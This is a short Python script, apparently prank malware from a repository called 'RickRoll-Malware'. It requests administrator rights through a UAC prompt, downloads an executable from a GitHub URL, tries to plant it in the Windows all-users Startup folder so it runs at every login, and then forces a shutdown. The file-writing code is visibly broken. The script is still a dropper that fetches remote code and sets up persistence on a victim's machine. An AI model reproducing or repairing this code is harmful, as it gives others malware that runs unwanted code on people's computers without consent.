import ctypes
import os
import requests
import subprocess

if os.name != 'nt':
    print("Nice Try Fucker")
    exit()

if not ctypes.windll.shell32.IsUserAnAdmin():
    print('Not enough priviledge, restarting...')
    import sys
    ctypes.windll.shell32.ShellExecuteW(
        None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
    exit(0)
else:
    try:
        roller = requests.get('https://github.com/FyreWolf99/RickRoll-Malware/raw/main/dist/roller.exe')

        startup = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'

        with open('c:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/roller.py') as outFile:
            outFile.write(roller)
        os.system('shutdown')
    except:
        print("Failed! Please try again as Administrator!")
